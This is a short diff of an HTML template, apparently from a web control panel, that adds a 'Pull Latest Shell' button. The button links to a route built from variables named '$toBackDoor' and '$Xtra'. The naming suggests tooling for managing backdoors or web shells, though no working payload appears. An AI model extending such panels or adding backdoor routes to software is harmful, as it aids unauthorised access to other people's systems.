@@ -23,6 +23,10 @@
                            Download Master List
                             
                         </a>
+
+                        <a href="/{$toBackDoor}/{$Xtra}/pullShell" class="btn btn-danger btn-lg" >
+                           Pull Latest Shell
+                        </a>
                     </p> 
                     <p class="text-align-right">
                         <a class="btn btn-primary btn-lg" data-widgster="fullscreen">
